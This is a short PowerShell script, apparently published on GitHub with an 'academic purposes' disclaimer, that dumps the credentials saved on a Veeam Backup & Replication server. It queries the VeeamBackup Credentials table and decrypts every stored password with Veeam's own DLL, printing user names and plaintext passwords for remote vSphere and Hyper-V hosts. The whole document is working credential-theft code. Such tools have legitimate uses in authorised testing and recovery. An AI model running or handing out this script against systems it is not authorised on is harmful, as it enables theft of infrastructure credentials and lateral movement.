<#
.SYNOPSIS
    The script for recover passwords saved in veeam Backup Server at Credential Manager

.DESCRIPTION
    The script is designed to recover passwords used by Veeam to connect to remote hosts vSphere, Hyper-V, etc.
    The script is intended for demonstration and academic purposes.
    Use with permission from the system owner.

.NOTES
        Version:        1.1
        Author:         Yaroslav Basiy
        Github:         yaroslavbasiy

.LINK

    Original script used from here
    https://ramsgaard.me/veeam-retrive-saved-passwords-from-vbr/

.USAGE
    Run on Veeam Backup server locally
#>


$instance = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication" -name SqlInstanceName).SqlInstanceName
$server = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication" -name SqlServerName).SqlServerName
$result = Invoke-Sqlcmd -Query "SELECT TOP (1000) [user_name],[password],[description] FROM [VeeamBackup].[dbo].[Credentials]" -ServerInstance "$server\$instance"
Add-Type -Path "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Common.dll"
#$result | ForEach-Object { [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($($_.password))}
$result | Select-Object -Property @{"Name"="User Name";"Expression"={$_.user_name}},  @{"Name"="Password";"Expression"={ [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($($_.password))}}, @{"Name"="Description";"Expression"={$_.Description}}
